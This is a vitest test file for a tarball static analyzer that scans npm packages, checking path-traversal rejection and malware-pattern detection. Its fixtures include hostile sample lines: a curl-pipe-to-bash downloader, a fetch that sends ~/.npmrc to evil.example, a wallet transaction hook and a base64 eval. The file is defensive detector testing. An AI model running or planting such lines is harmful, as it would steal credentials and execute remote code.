import { describe, expect, test } from 'vitest';
import {
  analyzeTarballEntries,
  assertSafeTarPath
} from '../../src/analyzers/tarball-static-analyzer.js';

describe('tarball static analyzer', () => {
  test('rejects path traversal and absolute paths during safe extraction', () => {
    expect(() => assertSafeTarPath('../escape.js')).toThrow(/Unsafe tar entry/);
    expect(() => assertSafeTarPath('/tmp/escape.js')).toThrow(/Unsafe tar entry/);
    expect(() => assertSafeTarPath('C:\\escape.js')).toThrow(/Unsafe tar entry/);
  });

  test('flags hidden directories, binary extensions, shell scripts, and large minified blobs', () => {
    const result = analyzeTarballEntries([
      { path: 'package/.github/workflows/ci.yml', size: 10 },
      { path: 'package/native.node', size: 10 },
      { path: 'package/scripts/install.ps1', size: 10 },
      {
        path: 'package/dist/bundle.min.js',
        size: 600_000,
        sample: 'var a="aaaaaaaaaaaaaaaaaaaaaaaa";'
      }
    ]);

    expect(result.signals.map((signal) => signal.id)).toEqual(
      expect.arrayContaining([
        'hidden-directory',
        'suspicious-binary',
        'suspicious-script-file',
        'large-minified-javascript'
      ])
    );
  });

  test('flags high-risk malware patterns from bounded tarball text samples', () => {
    const result = analyzeTarballEntries([
      {
        path: 'package/install.js',
        size: 200,
        sample:
          "require('child_process').exec('curl https://evil.example/setup_bun.sh | bash')"
      },
      {
        path: 'package/lib/steal.js',
        size: 300,
        sample:
          "const fs = require('fs'); fetch('https://evil.example', { body: fs.readFileSync(process.env.HOME + '/.npmrc') });"
      },
      {
        path: 'package/dist/browser.js',
        size: 250,
        sample: 'window.ethereum.request({ method: "eth_sendTransaction", params: tx })'
      },
      {
        path: 'package/dist/payload.js',
        size: 250,
        sample: "eval(Buffer.from('ZXZpbA==', 'base64').toString())"
      }
    ]);

    expect(result.signals.map((signal) => signal.id)).toEqual(
      expect.arrayContaining([
        'install-downloader-pattern',
        'credential-harvesting-pattern',
        'child-process-network-exfil',
        'wallet-transaction-hook',
        'obfuscated-code-pattern'
      ])
    );
    expect(result.signals[0]?.evidence?.[0]?.value).toEqual(
      expect.objectContaining({
        matchedPattern: expect.any(String),
        tarballEntry: expect.objectContaining({ path: expect.any(String) })
      })
    );
  });
});
